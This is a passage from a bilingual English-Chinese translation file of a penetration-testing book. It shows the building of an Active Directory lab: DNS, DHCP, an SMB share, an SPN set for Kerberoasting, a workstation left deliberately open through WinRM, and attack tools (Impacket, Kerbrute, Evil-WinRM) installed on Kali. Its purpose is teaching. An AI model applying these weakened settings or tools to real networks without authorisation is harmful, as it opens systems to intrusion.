  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.25 – 新区域向导
- en: Then, we want to select the option to replicate on all domain controllers in
    the **labcorp.local** domain. Click the **Next >** button and then select the
    **Ipv4 Reverse Lookup Zone option**, and proceed by clicking **Next >** again.
    After these two screens, you will be brought to a screen where you can declare
    the network ID for **Reverse Lookup Zone Name**:![Figure 10.26 – Reverse Lookup
    Zone Name
  id: totrans-110
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 然后，我们需要选择一个选项，以便在**labcorp.local**域中的所有域控制器上复制。点击**下一步 >** 按钮，然后选择**Ipv4 反向查找区域选项**，再点击**下一步
    >**。在这两屏后，你将进入一个界面，可以声明**反向查找区域名称**的网络 ID：![图 10.26 – 反向查找区域名称
- en: '](image/Figure_10.26_B16321.jpg)'
  id: totrans-111
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.26_B16321.jpg)'
- en: Figure 10.26 – Reverse Lookup Zone Name
  id: totrans-112
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.26 – 反向查找区域名称
- en: Click **Next >** on the **Dynamic Update** screen, then finally click **Finish**.
    You will now see a reverse zone established and running. Next, we want to set
    the resource scavenging by right-clicking on the server and selecting **Set Aging/Scavenging
    for All Zones…**:![Figure 10.27 – Scavenging for all zones
  id: totrans-113
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在**动态更新**界面点击**下一步 >**，然后最后点击**完成**。此时，你将看到一个已建立并运行的反向区域。接下来，我们需要通过右键点击服务器，选择**为所有区域设置老化/回收...**来设置资源回收：![图
    10.27 – 所有区域的回收
- en: '](image/Figure_10.27_B16321.jpg)'
  id: totrans-114
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.27_B16321.jpg)'
- en: Figure 10.27 – Scavenging for all zones
  id: totrans-115
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.27 – 所有区域的回收
- en: 'Set the option to **Scavenge stale resource records**, and then apply the settings
    shown in the following screenshot:'
  id: totrans-116
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 设置选项为**回收过时的资源记录**，然后应用以下截图所示的设置：
- en: '![Figure 10.28 – Set Aging/Scavenging Properties'
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.28 – 设置老化/回收属性'
- en: '](image/Figure_10.28_B16321.jpg)'
  id: totrans-118
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.28_B16321.jpg)'
- en: Figure 10.28 – Set Aging/Scavenging Properties
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.28 – 设置老化/回收属性
- en: After you have set the aging/scavenging properties, you will have finished configuring
    the DNS server. Now, we will continue by installing and configuring the DHCP server.
  id: totrans-120
  prefs: []
  type: TYPE_NORMAL
  zh: 在设置了老化/清理属性后，您就完成了 DNS 服务器的配置。现在，我们将继续安装和配置 DHCP 服务器。
- en: Adding and installing the DHCP server
  id: totrans-121
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 添加和安装 DHCP 服务器
- en: 'We have completed the setup for the DNS server. Now, we will move on to the
    addition and installation of the DHCP server, by taking the following steps:'
  id: totrans-122
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经完成了 DNS 服务器的设置。现在，我们将继续通过以下步骤添加和安装 DHCP 服务器：
- en: Clicking the **DHCP** option on the left-hand side menu will bring up the list
    of servers. You should see a notification – **Configuration required for DHCP
    Server at DC01**. Right-click on the server and select **DHCP Manager**:![Figure
    10.29 – DHCP server configuration
  id: totrans-123
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击左侧菜单中的**DHCP**选项将显示服务器列表。您应该会看到一条通知——**需要为 DC01 上的 DHCP 服务器配置**。右键点击服务器并选择**DHCP
    管理器**：![图 10.29 – DHCP 服务器配置
- en: '](image/Figure_10.29_B16321.jpg)'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.29_B16321.jpg)'
- en: Figure 10.29 – DHCP server configuration
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.29 – DHCP 服务器配置
- en: 'You will then be presented with the following screen:'
  id: totrans-126
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 然后，您将看到以下屏幕：
- en: '![Figure 10.30 – DHCP Manager'
  id: totrans-127
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.30 – DHCP 管理器'
- en: '](image/Figure_10.30_B16321.jpg)'
  id: totrans-128
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.30_B16321.jpg)'
- en: Figure 10.30 – DHCP Manager
  id: totrans-129
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.30 – DHCP 管理器
- en: Right-click on the **dc01.labcorp.local** server and select **Authorize** from
    the context menu:![Figure 10.31 – Context menu
  id: totrans-130
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 右键点击**dc01.labcorp.local**服务器，从上下文菜单中选择**授权**：![图 10.31 – 上下文菜单
- en: '](image/Figure_10.31_B16321.jpg)'
  id: totrans-131
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.31_B16321.jpg)'
- en: Figure 10.31 – Context menu
  id: totrans-132
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.31 – 上下文菜单
- en: After authorization, we are going to add a new scope for IPv4\. Right-click
    the **IPv4** icon and select **New Scope...**:![Figure 10.32 – IPv4 new scope
  id: totrans-133
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 授权后，我们将为 IPv4 添加一个新作用域。右键点击**IPv4**图标，选择**新建作用域...**：![图 10.32 – IPv4 新作用域
- en: '](image/Figure_10.32_B16321.jpg)'
  id: totrans-134
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.32_B16321.jpg)'
- en: Figure 10.32 – IPv4 new scope
  id: totrans-135
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.32 – IPv4 新作用域
- en: This will bring up a series of configuration screens. Click through the screens
    and give your scope a name. I used **Lab Corp** as a name to keep things simple.
    Next, you will be brought to an **IP Address Range** configuration screen, where
    you will need to enter your starting and ending IP address. The next screen shows
    the options that I have picked:![Figure 10.33 – IP Address Range
  id: totrans-136
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这将带来一系列配置屏幕。逐个点击屏幕并为您的作用域命名。我使用**Lab Corp**作为名称，以简化操作。接下来，您将进入一个**IP 地址范围**配置屏幕，在这里需要输入起始和结束
    IP 地址。下一个屏幕显示了我选择的选项：![图 10.33 – IP 地址范围
- en: '](image/Figure_10.33_B16321.jpg)'
  id: totrans-137
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.33_B16321.jpg)'
- en: Figure 10.33 – IP Address Range
  id: totrans-138
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.33 – IP 地址范围
- en: For the **Add Exclusions and Delay** option, I simply left it blank and clicked
    the **Next >** button. For the **Lease Duration** option, I set it to **8** days
    and clicked **Next >**. After doing this, you will be brought to a screen where
    you want to select **Yes** to apply these options. After doing this, click the
    **Next >** button. On the **Router** screen, I didn't make any changes and clicked
    **Next >**. If everything was configured in the correct order, you should now
    see a **Domain Name and DNS Servers** screen that should be auto-populated, as
    shown in the following screenshot:![Figure 10.34 – DNS servers screen
  id: totrans-139
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 对于**添加排除项和延迟**选项，我简单地留空并点击**下一步 >**按钮。对于**租期**选项，我将其设置为**8**天并点击**下一步 >**。完成后，您将看到一个屏幕，在此选择**是**以应用这些选项。然后点击**下一步
    >**按钮。在**路由器**屏幕上，我没有做任何更改，直接点击**下一步 >**。如果一切配置正确，您现在应该看到一个**域名和 DNS 服务器**的屏幕，应该会自动填充，如下截图所示：![图
    10.34 – DNS 服务器屏幕
- en: '](image/Figure_10.34_B16321.jpg)'
  id: totrans-140
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.34_B16321.jpg)'
- en: Figure 10.34 – DNS servers screen
  id: totrans-141
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.34 – DNS 服务器屏幕
- en: Click **Next >** through the subsequent screens, and make sure you select **Yes**
    to activate the scope. Finally, click the **Finish** button. Now, we want to run
    the post configuration by clicking the **More** link on the notification banner
    that we saw earlier. This brings us to a screen with the **Post-deployment Configuration**
    option, where we want to click **Complete DHCP configuration**:![Figure 10.35
    – Complete DHCP configuration
  id: totrans-142
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击**下一步 >**通过后续的屏幕，并确保选择**是**以激活作用域。最后，点击**完成**按钮。现在，我们想通过点击之前看到的通知横幅上的**更多**链接来运行后配置。这将带我们进入一个屏幕，显示**部署后配置**选项，在这里我们需要点击**完成
    DHCP 配置**：![图 10.35 – 完成 DHCP 配置
- en: '](image/Figure_10.35_B16321.jpg)'
  id: totrans-143
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.35_B16321.jpg)'
- en: Figure 10.35 – Complete DHCP configuration
  id: totrans-144
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.35 – 完成 DHCP 配置
- en: 'This will bring you to the following **Authorization** screen, where you will
    want to click the **Commit** button and then **Close**:'
  id: totrans-145
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 这将带你进入以下**授权**屏幕，在这里你需要点击**提交**按钮，然后点击**关闭**：
- en: '![Figure 10.36 – Authorization'
  id: totrans-146
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.36 – 授权'
- en: '](image/Figure_10.36_B16321.jpg)'
  id: totrans-147
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.36_B16321.jpg)'
- en: Figure 10.36 – Authorization
  id: totrans-148
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.36 – 授权
- en: We should now have a fully configured domain controller running AD, DNS, and
    DHCP servers.
  id: totrans-149
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们应该已经有一个完全配置好的域控制器，正在运行AD、DNS和DHCP服务器。
- en: Adding and installing network file sharing
  id: totrans-150
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 添加和安装网络文件共享
- en: 'Next, we are going to simulate network file sharing by clicking on **File and
    Storage Services**, selecting **TASKS**, and clicking on **New Share…**, as shown
    in the following screenshot:'
  id: totrans-151
  prefs: []
  type: TYPE_NORMAL
  zh: 接下来，我们将通过点击**文件和存储服务**，选择**任务**，然后点击**新建共享...**来模拟网络文件共享，如下图所示：
- en: '![Figure 10.37 – File and Storage Services'
  id: totrans-152
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.37 – 文件和存储服务'
- en: '](image/Figure_10.37_B16321.jpg)'
  id: totrans-153
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.37_B16321.jpg)'
- en: Figure 10.37 – File and Storage Services
  id: totrans-154
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.37 – 文件和存储服务
- en: 'In the next screenshot, you can see that we have five options for two protocols:'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一个截图中，你可以看到我们有五个选项，适用于两种协议：
- en: '**Server Message Block** (**SMB**)'
  id: totrans-156
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**服务器消息块**（**SMB**）'
- en: '**Network File System** (**NFS**)'
  id: totrans-157
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**网络文件系统**（**NFS**）'
- en: 'If you recall in [*Chapter 6*](B16321_06_Epub_AM.xhtml#_idTextAnchor063), *Packet
    Deep Dive*, we discussed that these protocols are commonly found inside of a corporate
    network. Here is one of the primary sources of those protocols. We want to generate
    **SMB Share – Quick**, as shown in the following screenshot:'
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
  zh: 如果你记得在[*第6章*](B16321_06_Epub_AM.xhtml#_idTextAnchor063)中，我们讨论了这些协议通常存在于公司网络内部。这里是这些协议的主要来源之一。我们想生成**SMB共享
    - 快速**，如下图所示：
- en: '![Figure 10.38 – SMB and NFS share selection'
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.38 – SMB和NFS共享选择'
- en: '](image/Figure_10.38_B16321.jpg)'
  id: totrans-160
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.38_B16321.jpg)'
- en: Figure 10.38 – SMB and NFS share selection
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.38 – SMB和NFS共享选择
- en: 'In the next step, we will select the server and share the location as follows:'
  id: totrans-162
  prefs: []
  type: TYPE_NORMAL
  zh: 在下一个步骤中，我们将选择服务器并按照如下方式共享位置：
- en: '**dc01**'
  id: totrans-163
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**dc01**'
- en: '**C:**'
  id: totrans-164
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**C:**'
- en: 'We are going to give **LabFiles1** as the **share** name, as this in turn will
    autogenerate the **Local path to share** and **Remote path to share** values,
    as shown in the following screenshot:'
  id: totrans-165
  prefs: []
  type: TYPE_NORMAL
  zh: 我们将**LabFiles1**作为**共享**名称，因为这将自动生成**共享的本地路径**和**共享的远程路径**值，如下图所示：
- en: '![Figure 10.39 – Specify share name'
  id: totrans-166
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.39 – 指定共享名称'
- en: '](image/Figure_10.39_B16321.jpg)'
  id: totrans-167
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.39_B16321.jpg)'
- en: Figure 10.39 – Specify share name
  id: totrans-168
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.39 – 指定共享名称
- en: Now click the **Next >** button on the **Other Settings**, **Permissions**,
    and **Confirmation** screens. Finally, click **Create**, and there you have it.
    An SMB file share has been created.
  id: totrans-169
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，在**其他设置**、**权限**和**确认**屏幕上，点击**下一步 >**按钮。最后，点击**创建**，文件共享就完成了。
- en: Configuring Kerberos
  id: totrans-170
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 配置Kerberos
- en: 'We need to set up Kerberos on our domain controller to allow us to examine
    Kerberoasting, a common attack that can be used to exploit AD. Enter the following
    command to set up the **service principal name** (**SPN**), using **operator3**
    in this case:'
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
  zh: 我们需要在域控制器上设置Kerberos，以便我们能够检查Kerberoasting，这是一种常见的攻击方式，可能会被用来利用AD。输入以下命令来设置**服务主体名称**（**SPN**），此处使用的是**operator3**：
- en: setspn -a DC01/operator3.labcorp.local:9999 labcorp\operator3
  id: totrans-172
  prefs: []
  type: TYPE_NORMAL
  zh: setspn -a DC01/operator3.labcorp.local:9999 labcorp\operator3
- en: 'If the command is successful, you should see the following output:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
  zh: 如果命令成功执行，你应该看到如下输出：
- en: '![Figure 10.40 – SPN setup'
  id: totrans-174
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.40 – SPN设置'
- en: '](image/Figure_10.40_B16321.jpg)'
  id: totrans-175
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.40_B16321.jpg)'
- en: Figure 10.40 – SPN setup
  id: totrans-176
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.40 – SPN设置
- en: Now that we have an SPN set, this concludes the steps for installing and configuring
    features on the domain controller. We can now move on to building the workstation.
  id: totrans-177
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经设置了SPN，安装和配置域控制器功能的步骤也就完成了。接下来，我们可以开始搭建工作站。
- en: Installing and configuring workstations
  id: totrans-178
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: 安装和配置工作站
- en: 'Navigate to the following link to find the ISO related to Windows 10: [https://www.microsoft.com/en-ca/software-download/windows10ISO](https://www.microsoft.com/en-ca/software-download/windows10ISO).'
  id: totrans-179
  prefs: []
  type: TYPE_NORMAL
  zh: 请访问以下链接查找与Windows 10相关的ISO：[https://www.microsoft.com/en-ca/software-download/windows10ISO](https://www.microsoft.com/en-ca/software-download/windows10ISO)。
- en: 'I am going to let you spin up the Windows 10 Pro for Workstations VM, and I
    will simply skip ahead to the step where we add the workstation to the domain:'
  id: totrans-180
  prefs: []
  type: TYPE_NORMAL
  zh: 我将让你启动Windows 10 Pro for Workstations虚拟机，我会直接跳到我们将工作站添加到域的步骤：
- en: After all the updates have been set, you will want to navigate to the Windows
    Start menu. From here, you will want to go to **Settings** | **System** | **About**
    | **Rename this PC (advanced)**, as shown in the following screenshot:![Figure
    10.41 – About PC
  id: totrans-181
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 在所有更新设置完成后，你需要进入 Windows 开始菜单。然后，前往**设置** | **系统** | **关于** | **重命名此 PC（高级）**，如下所示的截图所示：![图
    10.41 – 关于此 PC
- en: '](image/Figure_10.41_B16321.jpg)'
  id: totrans-182
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.41_B16321.jpg)'
- en: Figure 10.41 – About PC
  id: totrans-183
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.41 – 关于此 PC
- en: Click the **Rename this PC (advanced)** link on this screen, and it will bring
    up the following **System Properties** screen:![Figure 10.42 – System Properties
  id: totrans-184
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 点击此屏幕上的**重命名此 PC（高级）**链接，它将显示以下**系统属性**屏幕：![图 10.42 – 系统属性
- en: '](image/Figure_10.42_B16321.jpg)'
  id: totrans-185
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.42_B16321.jpg)'
- en: Figure 10.42 – System Properties
  id: totrans-186
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.42 – 系统属性
- en: From here, click the **Change...** button to set **Computer name**. Then set
    the **Domain** name that the workstation can join, as shown here:![Figure 10.43
    – Computer name and domain
  id: totrans-187
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 从这里，点击**更改...**按钮以设置**计算机名称**。然后设置工作站可以加入的**域**名，如下所示：![图 10.43 – 计算机名称和域
- en: '](image/Figure_10.43_B16321.jpg)'
  id: totrans-188
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.43_B16321.jpg)'
- en: Figure 10.43 – Computer name and domain
  id: totrans-189
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.43 – 计算机名称和域
- en: If everything has been configured correctly, you should get a Windows Security
    popup asking you to enter the name and password of an account with permission
    to join the domain. If you recall in the last section, we created a Domain Admin
    account. Go ahead and use those credentials to add this workstation to the domain:![Figure
    10.44 – Domain Admin login
  id: totrans-190
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 如果一切配置正确，你应该会看到一个 Windows 安全弹窗，提示你输入具有加入域权限的账户的用户名和密码。如果你还记得上一节中，我们创建了一个域管理员账户。请使用该账户的凭证将工作站加入域：![图
    10.44 – 域管理员登录
- en: '](image/Figure_10.44_B16321.jpg)'
  id: totrans-191
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.44_B16321.jpg)'
- en: Figure 10.44 – Domain Admin login
  id: totrans-192
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.44 – 域管理员登录
- en: 'If successful, you will be presented with the following message:'
  id: totrans-193
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 如果成功，你将看到以下消息：
- en: '![Figure 10.45 – labcorp.local'
  id: totrans-194
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '![图 10.45 – labcorp.local'
- en: '](image/Figure_10.45_B16321.jpg)'
  id: totrans-195
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '](image/Figure_10.45_B16321.jpg)'
- en: Figure 10.45 – labcorp.local
  id: totrans-196
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 图 10.45 – labcorp.local
- en: Once you click the **OK** button, you will be notified that for the changes
    to take effect you will need to reboot the workstation. Go ahead and reboot it.
  id: totrans-197
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 一旦点击**确定**按钮，你将收到通知，告知你需要重启工作站才能使更改生效。请继续重启工作站。
- en: 'The final step will be to test whether the user that we created in the last
    section can log into this computer. Use the **operator1** account to log into
    the workstation computer:'
  id: totrans-198
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
  zh: 最后一步是测试我们在上一节创建的用户是否能够登录到这台计算机。使用**operator1**账户登录到工作站计算机：
- en: '![Figure 10.46 – operator1 login'
  id: totrans-199
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.46 – operator1 登录'
- en: '](image/Figure_10.46_B16321.jpg)'
  id: totrans-200
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.46_B16321.jpg)'
- en: Figure 10.46 – operator1 login
  id: totrans-201
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.46 – operator1 登录
- en: 'A few extra configuration pieces need to be implemented in order to place the
    workstation into a vulnerable state:'
  id: totrans-202
  prefs: []
  type: TYPE_NORMAL
  zh: 为了将工作站置于脆弱状态，还需要执行一些额外的配置：
- en: Turn the **Windows Remote Management** service on by simply starting it.
  id: totrans-203
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 通过启动**Windows 远程管理**服务来启用它。
- en: Add **Scada** to **Local** **Group** | **Remote Management Users.**
  id: totrans-204
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 将**Scada**添加到**本地** **组** | **远程管理用户**。
- en: Make sure firewall rules are enabled for port **3389**.
  id: totrans-205
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: 确保已启用防火墙规则，允许**3389**端口。
- en: 'Under **Services**, open up **Windows Remote Management (WS-Management) Properties**.
    Under **General**, we are going to set **Startup type** as **Automatic**, then
    click **Start** to get **Service status** as **Running**, as follows:'
  id: totrans-206
  prefs: []
  type: TYPE_NORMAL
  zh: 在**服务**下，打开**Windows 远程管理（WS-Management）属性**。在**常规**选项卡下，将**启动类型**设置为**自动**，然后点击**启动**，使**服务状态**变为**正在运行**，如下所示：
- en: '![Figure 10.47 – Service status'
  id: totrans-207
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.47 – 服务状态'
- en: '](image/Figure_10.47_B16321.jpg)'
  id: totrans-208
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.47_B16321.jpg)'
- en: Figure 10.47 – Service status
  id: totrans-209
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.47 – 服务状态
- en: 'Here we want to add the **LABCORP\Scada** group to the **Remote Management
    Users** group on the Windows 10 workstation:'
  id: totrans-210
  prefs: []
  type: TYPE_NORMAL
  zh: 在这里，我们要将**LABCORP\Scada**组添加到 Windows 10 工作站的**远程管理用户**组中：
- en: '![Figure 10.48 – Remote management group'
  id: totrans-211
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.48 – 远程管理组'
- en: '](image/Figure_10.48_B16321.jpg)'
  id: totrans-212
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.48_B16321.jpg)'
- en: Figure 10.48 – Remote management group
  id: totrans-213
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.48 – 远程管理组
- en: 'Under **Windows Defender Firewall with Advanced Security**, enable **Windows
    Remote Management**:'
  id: totrans-214
  prefs: []
  type: TYPE_NORMAL
  zh: 在**Windows Defender 高级安全防火墙**中，启用**Windows 远程管理**：
- en: '![Figure 10.49 – Windows Defender'
  id: totrans-215
  prefs: []
  type: TYPE_NORMAL
  zh: '![图 10.49 – Windows Defender'
- en: '](image/Figure_10.49_B16321.jpg)'
  id: totrans-216
  prefs: []
  type: TYPE_NORMAL
  zh: '](image/Figure_10.49_B16321.jpg)'
- en: Figure 10.49 – Windows Defender
  id: totrans-217
  prefs: []
  type: TYPE_NORMAL
  zh: 图 10.49 – Windows Defender
- en: This wraps up the installation and configuration of the workstation. We are
    now going to move on to the Kali VM, and ensure we have the tools installed to
    move forward.
  id: totrans-218
  prefs: []
  type: TYPE_NORMAL
  zh: 这标志着工作站安装和配置的完成。接下来我们将转到 Kali 虚拟机，确保我们已安装必要的工具，以便继续前进。
- en: Kali Linux tools
  id: totrans-219
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Kali Linux 工具
- en: 'Now that we have the corporate side of the network installed and configured,
    we will open up the Kali Linux attack box. From here, we need to install a few
    different tools that were mentioned in the *Technical requirements* section. These
    tools are extremely useful when dealing with Windows-based environments. I would
    say 100% of the companies that I have been involved with were all running some
    form and configuration of AD inside their corporate environment. The tools to
    install are listed as follows:'
  id: totrans-220
  prefs: []
  type: TYPE_NORMAL
  zh: 现在，我们已经安装并配置了企业网络的一部分，接下来我们将打开 Kali Linux 攻击盒子。从这里，我们需要安装一些在*技术要求*部分提到的工具。这些工具在处理基于
    Windows 的环境时非常有用。我认为我参与过的 100% 的公司都在其企业环境中运行了某种形式和配置的 Active Directory（AD）。需要安装的工具如下：
- en: '**Impacket**: The first tool that we are going to install on our Kali Linux
    VM will be Impacket. This is ultimately a library of Python classes that interact
    with Windows-based protocols at the packet level. This tool performs all the heavy
    lifting of building, connecting, maintaining, and tearing down a session. To get
    started, we want to use the following link: [https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases).'
  id: totrans-221
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Impacket**: 我们将在 Kali Linux 虚拟机上安装的第一个工具是 Impacket。它实际上是一个 Python 类库，能够在数据包级别与基于
    Windows 的协议进行交互。该工具负责完成会话的建立、连接、维护和拆除等繁重工作。要开始使用，请访问以下链接：[https://github.com/SecureAuthCorp/impacket/releases](https://github.com/SecureAuthCorp/impacket/releases)。'
- en: 'From here, download the latest package. When this is done, decompress the **.tar**
    file and simply run the following command inside the **impacket** folder:'
  id: totrans-222
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 从这里，下载最新的包。完成后，解压 **.tar** 文件并在 **impacket** 文件夹内运行以下命令：
- en: '**python3 -m pip install .**'
  id: totrans-223
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**python3 -m pip install .**'
- en: '**Kerbrute**: Next, we want to install Kerbrute. This is a tool that automates
    the enumeration of AD accounts. Use the following link: [https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3).'
  id: totrans-224
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Kerbrute**: 接下来，我们需要安装 Kerbrute。它是一个自动化枚举 Active Directory（AD）账户的工具。请使用以下链接：[https://github.com/ropnop/kerbrute/releases/tag/v1.0.3](https://github.com/ropnop/kerbrute/releases/tag/v1.0.3)。'
- en: Make sure that you change the executability of the file.
  id: totrans-225
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: 确保您修改了文件的可执行权限。
- en: '**Evil-WinRM**: Finally, we want to install **Evil-WinRM**. This is a tool
    for pentesting **Windows Remote Management** (**WinRM**). Run the following command:'
  id: totrans-226
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**Evil-WinRM**: 最后，我们需要安装 **Evil-WinRM**。这是一个用于渗透测试 **Windows 远程管理**（**WinRM**）的工具。运行以下命令：'
- en: '**sudo gem install evil-winrm**'
  id: totrans-227
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
  zh: '**sudo gem install evil-winrm**'
- en: In this section, we spent time building out a domain controller and workstation.
    We added AD, DNS, DHCP, and file share features to the domain controller. We created
    a domain and then added users to this domain, then joined the workstation to it.
    Finally, we made sure that our Kali Linux VM had the tools needed to "PWN" the
    corporate environment. In the next section, we will be using those tools we installed
    to move forward and launch attacks on the corporate side of the network.
  id: totrans-228
  prefs: []
  type: TYPE_NORMAL
  zh: 在本节中，我们花时间构建了域控制器和工作站。我们为域控制器添加了 AD、DNS、DHCP 和文件共享功能。我们创建了一个域并将用户添加到该域中，然后将工作站加入该域。最后，我们确保我们的
    Kali Linux 虚拟机具备了“PWN”企业环境所需的工具。在下一节中，我们将使用这些已安装的工具，继续推进并在企业网络中发起攻击。
- en: Discovering and launching our attacks
  id: totrans-229
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
  zh: 发现并启动我们的攻击
- en: We have the corporate lab established and configured, and we have installed
    new tools into our Kali distribution. The next item on the agenda is to start
    taking a look at the network that we have been dropped into. In [*Chapter 7*](B16321_07_Epub_AM.xhtml#_idTextAnchor081),
    *Scanning 101*, we covered a number of different tools. We can use them here to
    perform discovery attacks. However, I feel that it would be more appropriate to
    look at other methods to grow our pentesting arsenal.
  id: totrans-230
  prefs: []
  type: TYPE_NORMAL
  zh: 我们已经建立并配置了企业实验室，并将新工具安装到了 Kali 发行版中。接下来，我们要做的就是开始查看我们所接入的网络。在[*第7章*](B16321_07_Epub_AM.xhtml#_idTextAnchor081)，《扫描
    101》中，我们介绍了许多不同的工具。我们可以在这里使用这些工具进行发现性攻击。然而，我觉得更合适的方法是考虑其他方式来扩展我们的渗透测试工具箱。
- en: 'Let''s start by skipping over **rustscan** and **nmap** and jump right into
    enumerating host machines by their NetBIOS names. Run the **nbtscan** command
    on your current subnet by using the following command:'
  id: totrans-231
  prefs: []
